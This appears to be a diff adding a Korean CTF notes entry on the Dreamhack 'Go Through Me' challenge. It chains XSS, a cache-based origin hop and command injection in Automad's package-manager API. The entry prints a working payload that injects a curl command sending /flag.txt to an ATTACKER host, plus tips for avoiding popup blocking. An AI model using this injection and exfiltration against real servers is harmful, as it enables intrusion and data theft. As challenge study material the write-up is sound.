@@ -6,6 +6,38 @@
 
 ## Web 특수 사례
 
+### Dreamhack Go Through Me — user-panel bot -> admin-app Automad RCE
+
+구조:
+1. `user-panel` report bot가 `localhost:80`과 `http://admin-app/dashboard/login` 둘 다 로그인
+2. `user-panel` XSS에서 `window.open('http://admin-app/_resize?url=...')`를 사용하면 **admin-app 세션이 실린 상태로** `_resize`를 때릴 수 있음
+3. `_resize`는 외부 URL의 내용을 `admin-app/cache/downloads/<name>.<crc>`에 저장
+4. 같은 팝업을 `w.location = 'http://admin-app/cache/downloads/<cache>'`로 재탑승시키면, 캐시 파일이 HTML 스니핑되어 admin-app origin JS로 실행될 수 있음
+
+Automad RCE 포인트:
+- `/_api/package-manager/add-repository`
+- `PackageManagerController::addRepository()` -> `Composer->run("require {$name}:dev-{$branch}")`
+- `Composer::run()`이 Composer API 경로에서 예외가 나면 `exec("$php $this->pharPath $command 2>&1", ...)` fallback으로 내려감
+- `name`/`branch`가 쉘 이스케이프 없이 삽입되므로 `--badopt; <cmd> #` 형태로 명령 주입 가능
+
+실전 페이로드:
+```js
+let d = new FormData();
+d.append('__csrf__', csrf);
+d.append('__json__', JSON.stringify({
+  name: 'psr/log --badopt; curl -skG --data-urlencode x@/flag.txt https://ATTACKER/flag #',
+  repositoryUrl: 'https://ATTACKER/group/project',
+  platform: 'gitlab',
+  branch: 'master'
+}));
+fetch('/_api/package-manager/add-repository', { method: 'POST', body: d });
+```
+
+주의:
+- `github` adapter는 빈 `Authorization: token ` 헤더 때문에 public API도 `401` 날 수 있다. fake repo는 `gitlab` adapter로 맞추는 편이 안정적.
+- 외부 carrier는 `payload.html`보다 **짧은 확장자 없는 경로**가 안전했다. 일부 public tunnel은 `.html` 경로를 자체 페이지로 가로챌 수 있다.
+- 첫 `window.open()`만 user gesture로 허용되고, `setTimeout(() => open(...))`는 팝업 차단에 걸릴 수 있다. 후속 단계는 새 `open()`보다 **기존 창 `location` 재지정**이 안정적.
+
 ### Dell 지원 사이트 원본 사양 우회
 
 Dell 서비스 태그가 보이는데 `ReviewSpecs/GetOriginalConfiguration`가 403이면 export 엔드포인트를 먼저 본다.
